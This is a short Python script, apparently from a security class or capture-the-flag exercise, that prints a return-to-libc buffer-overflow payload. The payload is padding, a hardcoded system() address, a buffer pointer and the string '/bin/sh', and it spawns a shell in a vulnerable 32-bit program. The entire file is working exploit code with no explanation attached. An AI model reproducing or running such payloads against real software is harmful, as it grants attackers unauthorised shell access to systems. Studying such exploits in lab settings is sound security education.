from struct import pack
from shellcode import shellcode
import sys

system = 0x0804ef30
bufAddr = 0xbffeffa6

print('A'*22 + pack("<I", system) + "b"*4 + pack("<I", bufAddr +22+4+4+4) + "/bin/sh" + "\x00")